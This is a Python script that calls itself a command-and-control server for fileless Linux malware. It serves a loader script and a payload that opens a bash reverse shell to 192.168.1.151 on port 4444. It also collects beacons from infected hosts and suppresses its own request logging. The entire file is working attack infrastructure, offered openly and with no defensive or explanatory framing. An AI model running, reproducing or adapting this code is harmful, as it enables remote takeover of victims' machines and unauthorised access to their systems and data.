#!/usr/bin/env python3
"""
C2 Server for Fileless Linux Malware
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import threading

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/loader.py':
            self.serve_file('loader.py', 'text/python')
        elif self.path == '/payload.bin':
            # Serve a reverse shell payload
            payload = b"""#!/bin/bash
bash -i >& /dev/tcp/192.168.1.151/4444 0>&1 &
"""
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            self.wfile.write(payload)
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/beacon':
            length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(length)
            try:
                data = json.loads(post_data)
                print(f"[+] Beacon from {data.get('host', 'unknown')}: {data.get('status', 'unknown')}")
            except:
                pass
            self.send_response(200)
            self.end_headers()
    
    def serve_file(self, filename, content_type):
        try:
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-type', content_type)
            self.end_headers()
            self.wfile.write(content)
        except:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress logs

def run_server():
    server = HTTPServer(('0.0.0.0', 8000), C2Handler)
    print("[+] C2 Server running on http://0.0.0.0:8000")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
